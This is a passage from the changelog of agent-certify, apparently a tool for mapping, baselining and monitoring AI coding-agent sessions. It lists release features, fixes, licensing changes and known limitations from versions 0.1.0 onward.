- SPDX identifier `BUSL-1.1` in every source file and in `pyproject.toml`; LICENSE covers all versions
  (LIC-002, LIC-003). The license itself is unchanged
- GitHub Actions pinned by commit SHA; CI tools pinned by version (CIC-002); TestPyPI installs never resolve
  dependencies from TestPyPI (CIC-003)
- `.agent-certify/` is created with a `.gitignore`; `*.html` reports are ignored by this repository (PRV-002)

### Known limitations
- `watch` re-parses the whole session on every change (PRF-004); incremental reading is planned
- Baselines and policies are not signed (ARC-001); private keys are stored unencrypted (see SECURITY.md)

## [0.4.0] - 2026-10-27

### Added
- MCP server: agent-certify exposes 5 tools via Model Context Protocol
  - scan_topology, check_anomalies, blast_radius, check_policy, topology_summary
  - Auto-detects current session via CLAUDE_CODE_SESSION_ID
  - Setup: `claude mcp add agent-certify -- agent-certify mcp`
- OTel export: emit OpenTelemetry spans for scans and anomalies (`--otel`)
- Cursor agent-trace parser (provenance graph from .agent-trace files)
- Auto-detect input format from the content (Claude Code transcript, Cursor Agent Trace, MCP log)
- SPDX license headers on all source files

## [0.3.0] - 2026-10-27

### Added
- `agent-certify watch`: live monitoring of active sessions
- `agent-certify suggest-policy`: auto-generate policy from baseline
- Policy engine: FORBIDDEN (tool, link), REQUIRED, MAX_SUB_AGENTS rules
- MCP logs parser: enrich graphs with MCP server tool calls (`--include-mcp`)
- `learn --include-mcp` for MCP-aware baselines

### Fixed
- Certificates now compare sub-agents by type, not by unique id

## [0.2.0] - 2026-10-27

### Added
- `agent-certify learn`: auto-generate statistical baseline from N sessions
- Anomaly detection: new tools, FI deviation, error rate, sub-agent count
- Perspective-based node classification (engineering, risk, compliance, monitoring)
- KEYSTONE / LOAD-BEARING / PERIPHERAL labels (engineering perspective)

## [0.1.0] - 2026-10-27

### Added
- Claude Code JSONL parser (sessions + sub-agents)
- AgentFIScanner: Fragility Index on agent communication graphs
- BlastRadiusAnalyzer: impact analysis per node
- AgentCertificate: Ed25519 signed structural baseline
- Drift detection (certify + verify)
- HTML visualization with interactive graph
- CLI: scan, blast, keygen, certify, verify

[Unreleased]: https://github.com/zeekmartin/agent-certify/compare/v0.5.1...HEAD
[0.5.1]: https://github.com/zeekmartin/agent-certify/compare/v0.5.0...v0.5.1
[0.5.0]: https://github.com/zeekmartin/agent-certify/compare/v0.4.0...v0.5.0
[0.4.0]: https://github.com/zeekmartin/agent-certify/compare/v0.3.0...v0.4.0
[0.3.0]: https://github.com/zeekmartin/agent-certify/compare/v0.2.0...v0.3.0
[0.2.0]: https://github.com/zeekmartin/agent-certify/compare/da44351...v0.2.0
[0.1.0]: https://github.com/zeekmartin/agent-certify/commit/da44351
